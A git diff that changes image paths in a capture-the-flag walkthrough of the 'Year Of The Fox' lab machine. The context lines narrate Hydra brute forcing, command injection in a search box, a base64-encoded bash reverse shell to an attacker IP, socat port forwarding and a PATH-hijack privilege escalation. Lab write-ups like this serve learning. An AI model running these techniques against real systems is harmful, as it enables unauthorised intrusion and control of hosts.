@@ -75,7 +75,7 @@ Host script results:
 # Method to solve the challenge
 As usual the challenge will be starting with website after looking into nmap result. The website required us to login in order to proceed.
 <br>
-![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-1.png)
+![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-1.png)
 <br>
 Since we are do not have any username or password, we will proceed to the other services which is smb. We will be using `enum4linux` to scan and get information from smb.
 ```
@@ -102,15 +102,15 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-17 23:37:
 ```
 After trying with both username and random password from wordlist, username `rascal` have a password which allow him to login into the website. After login into the website and playing around, it seems that the search comand will print out the files. 
 <br>
-![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-2.png)
+![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-2.png)
 <br>
 The first idea when i saw this search feature is try to inject commands into the search feature.
 <br>
-![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-3.png)
+![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-3.png)
 <br>
 `pwd` command was managed to inject into the search feature an return other result. With this, we can confirmed that we are able to get a reverse shell from search feature. 
 <br>
-![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-4.png)
+![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-4.png)
 <br>
 After trying out to get a reverse shell, it failed as the serach function detected some invalid character. In order to avoid that, we will use `base64` to encode our reverse shell and decode it back in the search function
 ```
@@ -118,10 +118,10 @@ echo "bash -i >& /dev/tcp/10.6.105.254/1234 0>&1" | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42LjEwNS4yNTQvMTIzNCAwPiYxCg==
 ```
 <br>
-![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-5.png)
+![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-5.png)
 <br>
 We managed to get a reverse shell but it is a ugly shell and it is not a root account.
-![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-6.png)
+![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-6.png)
 
 # Privilege Escalation
 Before starting to look for information to perform privilege escalation, we could always change the ugly shell to interactive shell with following command:
@@ -169,11 +169,11 @@ After more investigation about port 22, it only allow localhost to connect with 
 <br>
 our machine: 
 <br>
-![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-7.png)
+![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-7.png)
 <br>
 Reverse Shell: 
 <br>
-![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-8.png)
+![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-8.png)
 <br>
 We could start to port forward once `socat` has successfully sent into the victim machine.
 ```
@@ -215,7 +215,7 @@ fox@10.10.30.135's password:
 ```
 After getting the file, we could anaylze with any RE tools. I will be using a free GUI tool named `cutter`. 
 <br>
-![](../assets/img/posts/2022-07-18-Year-Of-The-Fox-9.png)
+![](/assets/img/posts/2022-07-18-Year-Of-The-Fox-9.png)
 <br>
 After analying the whole file, there is some misconfiguration of the file as the `shutdown` will call `poweroff` but `sudoer` file did not provide absolute path which mean we could create of copy bash and rename it to `poweroff` and change the `path` to our fake `poweroff`.
 ```
